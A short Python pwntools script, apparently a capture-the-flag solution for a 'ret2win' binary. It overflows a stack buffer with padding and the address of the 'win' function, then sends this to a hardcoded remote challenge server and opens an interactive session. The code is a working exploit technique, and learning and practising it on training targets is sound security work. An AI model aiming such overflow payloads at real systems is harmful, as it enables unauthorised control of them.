import pwn

#p = pwn.process("./ret2win")
p = pwn.remote("34.134.85.196",1337)

elf = pwn.ELF("./ret2win")
win = elf.symbols['win']
p.sendline(b"A"*(0x28+4)+pwn.p32(win))
p.interactive()